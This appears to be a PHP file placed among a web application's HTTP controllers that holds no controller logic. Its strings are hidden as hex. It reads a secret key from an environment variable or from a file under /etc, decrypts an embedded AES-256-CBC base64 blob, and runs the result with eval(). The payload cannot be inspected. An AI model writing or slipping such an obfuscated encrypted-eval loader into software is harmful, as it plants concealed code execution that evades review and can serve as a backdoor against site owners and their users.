<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('HN6/dIfySSY8z1aQi2zGCg==');

$c=base64_decode(

'2almekjcslat9EgDUG0tW4caBkJjCZC8RDvLdih37i4yYIyROnGpzEsv7hAZIjULFhySkizNIuYn' .
'FETl+p2G7emHyZ8Nz6Fgyav9PNE2uHy1RBRWiDcZBBIhenQwh1cwfhkHgNcRWx6GA2PobS4ZITPq' .
'raSF/waVnH67GUsyNTRviCGyJfgwvyD/dp2kasVi0EYehxqMW6Po71XrFWDkLceLH3rZvJZJPVpq' .
'pZNIfyLGACDKn88n3PTfQK8TCCon7VOZLyDjAfSKrc1xh5q8ANDomzcF90aF3MwCr8JzKZE='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

